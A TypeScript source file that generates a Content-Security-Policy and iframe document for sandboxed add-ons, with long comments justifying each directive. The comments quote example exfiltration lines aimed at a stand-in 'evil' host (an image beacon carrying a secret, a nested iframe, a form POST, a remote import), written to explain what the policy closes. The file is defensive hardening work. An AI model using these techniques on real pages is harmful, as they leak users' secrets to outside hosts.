// SPDX-FileCopyrightText: 2026 quissicutdeus
//
// SPDX-License-Identifier: AGPL-3.0-or-later

/**
 * Everything a frame may reach, as one `<meta http-equiv="Content-Security-Policy">`.
 *
 * ## Why this used to be `connect-src` alone, and why that stopped being enough
 *
 * MICA-24 set `connect-src` and deliberately left every other directive unset. Its
 * reasoning is worth restating because it was right at the time: the ticket was about
 * `fetch()` to an arbitrary host, and tightening `script-src`/`style-src` risked breaking
 * Svelte's runtime-injected `<style>` tags and the inlined module script itself, with no
 * browser or game client in reach to verify against.
 *
 * What that reasoning missed is that `connect-src` is not the only way out. An unset
 * `img-src` means `new Image().src = 'http://evil/?' + secret` is an exfiltration channel
 * that needs no response to be useful, and an unset `frame-src` means the guest can nest
 * an `<iframe src="https://evil">`: CSP inherits into a child only for *local* schemes
 * (`about:`, `blob:`, `data:`, `srcdoc`), so a nested remote document gets **no** policy at
 * all — unrestricted `fetch`, and a `postMessage` relay back out through its parent. So
 * `networkHosts` was advisory: a declared allowlist of one origin, with three unpoliced
 * doors beside it.
 *
 * The answer to MICA-24's caution was `default-src 'none'` plus explicit escape hatches.
 * MICA-196 wrote `script-src` and `style-src` out at exactly the reach they had when they
 * were unset — any `https:` or `http:` host — so how an add-on's own code and styles loaded
 * did not change while everything else was shut. MICA-442 answered the rest of that
 * caution: both things MICA-24 feared breaking are inline (the module script, and the
 * `<style>` the add-on build injects), and `'unsafe-inline'` is what admits them, not the
 * scheme list. So the scheme list went.
 *
 * ## Directive by directive
 *
 * - `default-src 'none'` — the floor. Anything not named below (`object-src`,
 *   `manifest-src`, `prefetch-src`, `worker-src` via `child-src`) is refused.
 * - `connect-src` — unchanged: `AppManifest.networkHosts`, or `'none'`.
 * - `img-src` / `media-src` / `font-src`: `data: blob:` plus `networkHosts`. So
 *   `networkHosts` means *every* outbound request the frame makes, not only `fetch()`.
 *   Until MICA-202 these were `https: data: blob:` — subresource loads kept the practical
 *   reach they had, on the theory that an add-on renders photos and avatars whose URLs
 *   the phone hands it at runtime from any https origin. The audit behind MICA-202 found
 *   that theory did not describe the phone: everything the media service delivers to an
 *   add-on is a `data:` URI (`server/services/Media.ts`, "the delivery path is a data URI
 *   either way"), avatars are `data:`, and no in-tree add-on names an https image, clip
 *   or face anywhere. The one thing that can put an https URL in front of an add-on is
 *   another resource calling the `AddMedia` export with a hotlinked `url` — and that row
 *   now draws as a broken image inside a `core: false` add-on rather than opening
 *   `new Image().src = 'https://evil/?' + secret` to every add-on on the phone. `data:`
 *   and `blob:` stay because neither leaves the frame, and because a bundler inlines a
 *   small font face as a `data:` URI, which `default-src 'none'` would otherwise refuse.
 *   `'self'` is deliberately not here: the frame is `sandbox="allow-scripts"` with no
 *   `allow-same-origin`, so its origin is opaque and `'self'` matches nothing.
 * - `img-src` alone also carries the server's **image host**, when it has one (MICA-243).
 *   An owner who sets `mica_media_upload_url` makes the media service deliver `https:`
 *   URLs on that one origin instead of `data:` URIs, so the MICA-202 finding above stops
 *   being true for them — and a gallery add-on would draw every photo broken. The origin
 *   goes into `img-src` and nowhere else: not `connect-src`, so an add-on still cannot
 *   `fetch` it, and not `media-src`/`font-src`, which it has no reason to serve. It is one
 *   exact `https://<host>` the owner configured, checked twice on the way here
 *   (`server/lib/mediaHost.ts`, `services/imageHost.ts`), never a wildcard. What it opens
 *   is stated plainly: an add-on can beacon to the image host with an `<img>`, exactly as
 *   it can to its own `networkHosts`. An owner who hosts images has chosen that host.
 * - `script-src`: `'unsafe-inline' 'unsafe-eval' data: blob:` plus `networkHosts`, and
 *   `style-src` the same without `'unsafe-eval'` (MICA-442). Not the image host, which
 *   stays `img-src`'s alone. From MICA-196 until MICA-442 both also carried `https: http:`
 *   — the reach they had when unset, written out so the `default-src 'none'` floor would
 *   not change it. Nothing an add-on is made of is loaded by URL: its bundle is the
 *   verified text inlined below as one module script, built as a single chunk with its CSS
 *   injected as a `<style>` (`codeSplitting: false`, and `mica-inline-css` in
 *   `web/vite.addon.config.ts` or `mica-addon-inline-css` in the template's
 *   `vite.config.ts`), and the dev loop fetches source *text* and inlines it the same way
 *   (`devAddOn.ts`). So all the scheme list did was let `await import('https://any/x.js')`
 *   or an appended `<script src>` run code the pinned SHA never covered, and let any script
 *   or stylesheet URL carry a query string to any host, plaintext included.
 *   - `'unsafe-inline'` is what the module script, the fallback `error` listener and the
 *     injected `<style>` need. A nonce or hash would add nothing while `'unsafe-eval'`
 *     stands: code that can `eval` can run any text it holds.
 *   - `'unsafe-eval'` is unchanged. It runs text the bundle already holds and reaches no
 *     host, so it is not an exit, and this directive's job is the exits.
 *   - `data:` and `blob:` stay for the reason they stay in `img-src`: neither leaves the
 *     frame, and a script built from one is text the bundle already had.
 *   - `networkHosts`, because the manifest is the one statement of where a bundle may
 *     reach, for code as for everything else — see the last section.
 * - `frame-src 'none'` / `child-src 'none'` — no nested browsing context, which is the
 *   CSP-inheritance hole above. `child-src` is also `worker-src`'s fallback, so this stops
 *   a `Worker`/`SharedWorker` too. That is a real narrowing for an add-on that used one;
 *   it is accepted, because a worker is another script context reached through exactly the
 *   nesting this directive exists to close.
 * - `form-action 'none'` — a form POST is a navigation, and navigations are not governed by
 *   `connect-src`. Without this, `<form action="https://evil" method=post>` walks a payload
 *   straight out.
 * - `base-uri 'none'` — a `<base href>` injected into the guest would silently re-point
 *   every relative URL in the document.
 *
 * Every directive here is CSP Level 2 or earlier apart from `child-src` (also Level 2) and
 * `worker-src`'s fallback behaviour, so all of it is understood by Chromium 103 — the floor
 * AGENTS.md §6 holds this tree to. `navigate-to`, which is what would actually stop the
 * self-navigation described in `IframeHostServer.ts`, is deliberately absent: Chromium
 * never shipped it, in 103 or since, so the host checks the origin of every inbound message
 * and tears the frame down on a second `load` instead.
 *
 * ## What this still does not stop
 *
 * A declared host is a declared host. An add-on whose `networkHosts` names
 * `https://api.example.com` can beacon to it with an `<img>` exactly as it can `fetch()`
 * it, and that is the point: the manifest is the whole statement of where a bundle may send
 * bytes, and a reader no longer has to know that images, scripts or styles were the
 * exception. The same rule has a cost for code, said plainly: an add-on can also
 * `import()` a script or load a stylesheet from a host it declared, so what runs in the
 * frame is the SHA-pinned bundle **plus whatever its declared hosts serve**. A reader of
 * the manifest can see that much; what those hosts serve tomorrow, nothing here can.
 * Beyond that, what remains is the sandbox's own self-navigation, which no directive
 * Chromium ships can stop and which the host counts documents to catch
 * (`IframeHostServer.ts`).
 */
function cspFor(networkHosts: readonly string[], imageHosts: readonly string[]): string {
  /**
   * An empty list is `'none'`, not an omitted directive — CSP has no bare "block
   * everything" keyword for one directive alone, and omitting `connect-src` entirely would
   * now inherit `default-src 'none'`, which happens to be the same answer but for a reason
   * a reader would have to go and derive. Say it.
   */
  const connect = networkHosts.length > 0 ? networkHosts.join(' ') : "'none'";
  /**
   * Subresources: the schemes that cannot leave the frame, then the same hosts `fetch()`
   * may reach. Never `'none'`, because `data:` is always in the list — and never `https:`
   * again, which is what MICA-202 closed.
   */
  const subresources = ['data:', 'blob:', ...networkHosts];
  const loads = subresources.join(' ');
  /** Images alone may also come from the server's image host (MICA-243). */
  const images = [...new Set([...subresources, ...imageHosts])].join(' ');
  /**
   * Code and styles: inline, which is what the bundle is, then the same sources a
   * subresource may use (MICA-442). Never a bare scheme again, and never the image host.
   */
  const scripts = ["'unsafe-inline'", "'unsafe-eval'", ...subresources].join(' ');
  const styles = ["'unsafe-inline'", ...subresources].join(' ');
  const policy = [
    "default-src 'none'",
    `connect-src ${connect}`,
    `img-src ${images}`,
    `media-src ${loads}`,
    `font-src ${loads}`,
    `script-src ${scripts}`,
    `style-src ${styles}`,
    "frame-src 'none'",
    "child-src 'none'",
    "form-action 'none'",
    "base-uri 'none'"
  ].join('; ');
  return `<meta http-equiv="Content-Security-Policy" content="${policy}">`;
}

/**
 * The document an add-on runs in. The verified text is inlined directly as a module
 * script rather than wrapped in a `data:` URL — URL-encoding roughly triples a minified
 * bundle's size, which the browser then has to hold, decode and parse on every open.
 *
 * A syntax error in the inlined module fails to parse before `bootAddOn` ever runs, so
 * its own `window.addEventListener('error', ...)` never registers to catch it. The
 * fallback listener below is added first, in a plain (non-module) script, so it is live
 * before the module script is even parsed.
 */
export function srcdocFor(
  code: string,
  networkHosts: readonly string[] = [],
  imageHosts: readonly string[] = []
): string {
  const escaped = code.replace(/<\/script/gi, '<\\/script').replace(/<!--/g, '<\\!--');
  return [
    '<!doctype html><html><head><meta charset="utf-8">',
    cspFor(networkHosts, imageHosts),
    '<style>html,body{margin:0;height:100%;background:transparent;overflow:hidden}#app{height:100%}</style>',
    `<script>window.addEventListener('error', (e) => parent.postMessage({ kind: 'error', message: String((e.error && e.error.message) || e.message), stack: e.error instanceof Error ? (e.error.stack ?? null) : null }, '*'));</script>`,
    '</head><body><div id="app"></div>',
    `<script type="module">${escaped}</script>`,
    '</body></html>'
  ].join('');
}
